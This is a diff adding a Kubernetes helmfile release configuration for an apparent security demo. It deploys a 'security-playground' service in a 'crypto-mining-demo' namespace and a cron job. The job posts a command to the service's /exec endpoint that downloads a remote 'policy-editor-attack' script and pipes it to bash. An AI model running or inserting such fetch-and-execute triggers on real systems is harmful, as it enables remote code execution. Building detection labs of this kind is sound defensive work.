@@ -1,0 +1,16 @@
+releases:
+  - name: security-playground
+    namespace: crypto-mining-demo
+    chart: ../charts/security-playground
+    atomic: true
+
+  - name: policy-editor-trigger
+    namespace: crypto-mining-demo
+    chart: ../charts/command-trigger
+    atomic: true
+    values:
+      - image:
+          repository: python
+          tag: latest
+        schedule: "55 5 * * *"
+        command: curl -X POST http://security-playground.crypto-mining-demo.svc.cluster.local:8080/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'
